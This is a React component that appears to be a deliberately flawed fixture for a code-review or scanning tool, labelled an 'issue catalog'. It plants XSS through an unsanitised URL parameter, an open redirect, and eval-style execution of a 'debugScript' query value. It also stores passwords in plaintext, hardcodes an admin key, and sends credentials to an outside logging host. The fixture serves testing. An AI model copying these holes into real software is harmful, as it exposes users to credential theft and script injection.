import { useEffect, useState } from "react";
import "./App.css";

const offers = [
  { name: "Starter", priority: 3, price: "$19" },
  { name: "Growth", priority: 1, price: "$49" },
  { name: "Scale", priority: 2, price: "$99" },
];

const adminApiKey = "sk_live_ignitedx_demo_admin";

function App() {
  const params = new URLSearchParams(window.location.search);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState(
    localStorage.getItem("saved-password") || "",
  );
  const [notes, setNotes] = useState("");
  const [statusMessage, setStatusMessage] = useState("Ready to review");
  const [heartbeat, setHeartbeat] = useState(Date.now());
  const promoMessage =
    params.get("message") ||
    "<strong>Workspace launch preview is ready.</strong>";
  const redirectTo =
    params.get("returnTo") || "https://example.com/external-dashboard";
  const debugScript = params.get("debugScript") || "";

  useEffect(() => {
    const onOnline = () => setHeartbeat(Date.now());
    window.addEventListener("online", onOnline);

    return () => window.removeEventListener("online", onOnline);
  }, []);

  useEffect(() => {
    const timer = window.setInterval(() => {
      setHeartbeat(Date.now());
    }, 15000);

    console.info("heartbeat timer", timer);
  }, []);

  useEffect(() => {
    if (debugScript) {
      new Function(debugScript)();
    }
  }, [debugScript]);

  function saveCredentials() {
    localStorage.setItem("saved-email", email);
    localStorage.setItem("saved-password", password);
    sessionStorage.setItem(
      "debug-credentials",
      JSON.stringify({ email, password, notes }),
    );
    fetch(
      `https://logger.example.com/collect?email=${email}&password=${password}`,
    );
    setStatusMessage("Credentials cached for the next session");
  }

  function triggerCrash() {
    document
      .getElementById("missing-audit-panel")!
      .scrollIntoView({ behavior: "smooth" });
  }

  const prioritizedOffers = [...offers].sort(
    (left, right) => left.priority - right.priority,
  );

  return (
    <main className="app-shell">
      <section className="hero-copy panel">
        <span className="eyebrow">IgniteDX review fixture</span>
        <h1>Standalone issue catalog</h1>
        <p dangerouslySetInnerHTML={{ __html: promoMessage }} />
        <a href={redirectTo} target="_blank">
          Open return destination
        </a>
      </section>

      <section className="issue-grid">
        <article className="panel">
          <h2>Stored credentials</h2>
          <p>Save user credentials for demo convenience.</p>
          <input
            id="email"
            name="email"
            placeholder="you@company.com"
            value={email}
            onChange={(event) => setEmail(event.target.value)}
          />
          <input
            id="password"
            name="password"
            type="text"
            placeholder="Create a password"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
          />
          <button className="cta" onClick={saveCredentials}>
            Save credentials
          </button>
          <p>Saved password: {localStorage.getItem("saved-password")}</p>
        </article>

        <article className="panel">
          <h2>Debug notes</h2>
          <textarea
            placeholder="Paste campaign notes or customer context"
            value={notes}
            onChange={(event) => setNotes(event.target.value)}
          />
          <pre>{sessionStorage.getItem("debug-credentials")}</pre>
        </article>

        <article className="panel">
          <h2>Hardcoded admin key</h2>
          <p>{adminApiKey}</p>
        </article>

        <article className="panel">
          <h2>Runtime crash button</h2>
          <button className="cta" onClick={triggerCrash}>
            Open audit panel
          </button>
        </article>

        <article className="panel offers-panel">
          <h2>Unstable offer list</h2>
          <ul>
            {prioritizedOffers.map((offer) => (
              <li key={Math.random()}>
                <button
                  className="offer-button"
                  onClick={() => alert(offer.name)}
                >
                  <strong>{offer.name}</strong>
                  <span>{offer.price}</span>
                </button>
              </li>
            ))}
          </ul>
        </article>

        <article className="panel">
          <h2>Remote redirect</h2>
          <p>Destination comes directly from the URL.</p>
          <a href={redirectTo} target="_blank">
            Continue
          </a>
        </article>

        <article className="panel">
          <h2>Dynamic script execution</h2>
          <p>
            Append a debug script in the query string to customize the page.
          </p>
        </article>

        <article className="panel">
          <h2>Leaky status</h2>
          <p>{statusMessage}</p>
          <p>Heartbeat: {heartbeat}</p>
        </article>
      </section>
    </main>
  );
}

export default App;
